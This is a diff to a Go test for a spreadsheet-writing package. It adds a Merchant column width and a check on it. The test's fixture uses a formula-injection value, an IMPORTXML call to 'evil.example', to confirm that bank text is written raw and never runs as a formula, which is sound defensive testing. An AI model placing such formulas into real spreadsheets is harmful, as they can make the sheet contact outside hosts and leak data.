@@ -3,6 +3,7 @@ package sheets_test
 import (
 	"context"
 	"errors"
+	"fmt"
 	"net/http"
 	"net/url"
 	"testing"
@@ -21,7 +22,7 @@ func TestWriteIsRawWithDatesAsSerials(t *testing.T) {
 	}
 	merchant := "=IMPORTXML(\"https://evil.example\", \"//a\")"
 	tab := sheets.Tab{Title: "Transactions", Columns: []sheets.Column{
-		{Name: "Date", Kind: sheets.Date}, {Name: "Merchant"}, {Name: "Amount", Kind: sheets.Money}, {Name: "Note"},
+		{Name: "Date", Kind: sheets.Date}, {Name: "Merchant", Width: 200}, {Name: "Amount", Kind: sheets.Money}, {Name: "Note"},
 	}, Rows: [][]any{{"2026-10-09", &merchant, 12.5, (*string)(nil)}}}
 	if err := svc.Write(ctx, sp, tab); err != nil {
 		t.Fatal(err)
@@ -29,6 +30,9 @@ func TestWriteIsRawWithDatesAsSerials(t *testing.T) {
 	got := f.Sheets[sp.ID]
 	if got.Options["Transactions"] != "RAW" {
 		t.Errorf("valueInputOption = %q, want RAW so bank text never runs as a formula", got.Options["Transactions"])
+	}
+	if w := got.Widths[fmt.Sprintf("%d:1", got.Tabs["Transactions"])]; w != 200 || len(got.Widths) != 1 {
+		t.Errorf("widths = %v, want only Merchant fixed at 200", got.Widths)
 	}
 	row := got.Values["Transactions"][1]
 	if row[0] != float64(46304) || row[1] != merchant || row[2] != 12.5 || row[3] != "" {
